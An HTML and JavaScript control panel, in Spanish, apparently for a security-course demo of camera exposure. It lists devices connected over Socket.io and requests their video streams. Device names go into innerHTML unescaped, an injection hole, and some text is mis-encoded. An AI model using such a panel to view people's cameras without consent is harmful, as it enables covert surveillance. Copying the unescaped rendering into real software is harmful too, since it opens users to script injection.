<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control - Seguridad en Sistemas</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="admin-page">
    <div class="container">
        <header>
            <div class="logo">
                <h1>üè† Seguridad en Sistemas - Panel de Control</h1>
                <p>Gesti√≥n de dispositivos conectados</p>
            </div>
            <div class="status" id="status">
                <span class="status-dot"></span>
                <span>Sistema activo - <span id="deviceCount">0</span> dispositivos</span>
            </div>
        </header>
        
        <div class="main-content">
            <div class="video-container">
                <div class="video-header">
                    <h2>Vista previa principal</h2>
                    <div id="currentDevice">No hay dispositivos seleccionados</div>
                </div>
                <div class="video-wrapper">
                    <div id="mainVideo" class="video-placeholder">
                        <p>Selecciona un dispositivo para ver su transmisi√≥n</p>
                    </div>
                </div>
            </div>
            
            <div class="devices-panel">
                <h2 class="panel-title">
                    <span>üì± Dispositivos conectados</span>
                </h2>
                
                <div class="devices-list" id="devicesList">
                    <div class="empty-state">
                        <p>No hay dispositivos conectados</p>
                    </div>
                </div>
                
                <div class="controls">
                    <button class="btn btn-secondary" id="refreshBtn">
                        <span>‚Üª Actualizar</span>
                    </button>
                    <button class="btn btn-primary" id="broadcastBtn" disabled>
                        <span>‚ñ∂ Transmitir en pantalla</span>
                    </button>
                </div>
                
                <div class="connection-info">
                    <h3>Informaci√≥n de conexi√≥n</h3>
                    <p id="connectionStatus">Conectando al servidor...</p>
                    <p id="serverUrl">URL: <span>Cargando...</span></p>
                </div>
            </div>
        </div>
        
        <footer>
            <p>Seguridad en Sistemasa - Sistema de exposici√≥n de camara</p>
        </footer>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        // Configuraci√≥n de Socket.io para Render
        const socket = io({
            transports: ['websocket', 'polling']
        });
        
        let selectedDeviceId = null;
        let connectedDevices = [];
        
        // Elementos DOM
        const devicesList = document.getElementById('devicesList');
        const deviceCount = document.getElementById('deviceCount');
        const currentDevice = document.getElementById('currentDevice');
        const mainVideo = document.getElementById('mainVideo');
        const broadcastBtn = document.getElementById('broadcastBtn');
        const refreshBtn = document.getElementById('refreshBtn');
        const connectionStatus = document.getElementById('connectionStatus');
        const serverUrl = document.getElementById('serverUrl').querySelector('span');
        
        // Mostrar estado de conexi√≥n
        socket.on('connect', () => {
            console.log('Conectado al servidor con ID:', socket.id);
            connectionStatus.textContent = 'Conectado al servidor';
            connectionStatus.style.color = '#2ecc71';
            serverUrl.textContent = window.location.origin;
            
            // Solicitar lista de dispositivos al conectar
            socket.emit('get-devices');
        });
        
        socket.on('disconnect', (reason) => {
            console.log('Desconectado del servidor:', reason);
            connectionStatus.textContent = 'Desconectado - ' + reason;
            connectionStatus.style.color = '#e74c3c';
        });
        
        socket.on('connect_error', (error) => {
            console.error('Error de conexi√≥n:', error);
            connectionStatus.textContent = 'Error de conexi√≥n: ' + error.message;
            connectionStatus.style.color = '#e74c3c';
        });
        
        // Actualizar lista de dispositivos
        function updateDevicesList(devices) {
            deviceCount.textContent = devices.length;
            connectedDevices = devices;
            
            if (devices.length === 0) {
                devicesList.innerHTML = '<div class="empty-state"><p>No hay dispositivos conectados</p></div>';
                broadcastBtn.disabled = true;
                currentDevice.textContent = 'No hay dispositivos seleccionados';
                return;
            }
            
            devicesList.innerHTML = '';
            devices.forEach(device => {
                const isActive = device.id === selectedDeviceId;
                const deviceElement = document.createElement('div');
                deviceElement.className = `device-card ${isActive ? 'active' : ''}`;
                deviceElement.innerHTML = `
                    <div class="device-header">
                        <div class="device-name">${device.name}</div>
                        <div class="device-time">Conectado hace ${Math.round((new Date() - new Date(device.timestamp)) / 1000)} seg</div>
                    </div>
                    <div class="device-status">
                        <span class="status-indicator ${device.streamActive ? 'active' : 'inactive'}"></span>
                        ${device.streamActive ? 'Transmitiendo' : 'Inactivo'}
                    </div>
                    <div class="device-id">ID: ${device.id}</div>
                `;
                
                deviceElement.addEventListener('click', () => {
                    selectedDeviceId = device.id;
                    currentDevice.textContent = device.name;
                    updateDevicesList(connectedDevices);
                    broadcastBtn.disabled = false;
                });
                
                devicesList.appendChild(deviceElement);
            });
        }
        
        // Solicitar transmisi√≥n de un dispositivo
        function requestDeviceStream(deviceId) {
            socket.emit('request-view', deviceId);
            mainVideo.innerHTML = '<p>Conectando con el dispositivo...</p>';
        }
        
        // Configurar eventos
        broadcastBtn.addEventListener('click', () => {
            if (selectedDeviceId) {
                requestDeviceStream(selectedDeviceId);
                mainVideo.innerHTML = '<p>Transmitiendo en pantalla principal...</p>';
            }
        });
        
        refreshBtn.addEventListener('click', () => {
            socket.emit('get-devices');
            mainVideo.innerHTML = '<p>Actualizando lista de dispositivos...</p>';
            setTimeout(() => {
                if (connectedDevices.length === 0) {
                    mainVideo.innerHTML = '<p>No hay dispositivos conectados</p>';
                }
            }, 1000);
        });
        
        // Eventos de Socket.io
        socket.on('devices-updated', updateDevicesList);
        
        socket.on('stream-frame', (data) => {
            if (data.deviceId === selectedDeviceId) {
                const device = connectedDevices.find(d => d.id === data.deviceId);
                mainVideo.innerHTML = `
                    <div class="stream-container">
                        <p>Recibiendo transmisi√≥n de ${device?.name || 'dispositivo'}</p>
                        <div class="stream-placeholder">
                            <span>üé• Transmisi√≥n en vivo</span>
                            <div class="stream-timestamp">${new Date(data.timestamp).toLocaleTimeString()}</div>
                        </div>
                    </div>
                `;
            }
        });
    </script>
</body>
</html>
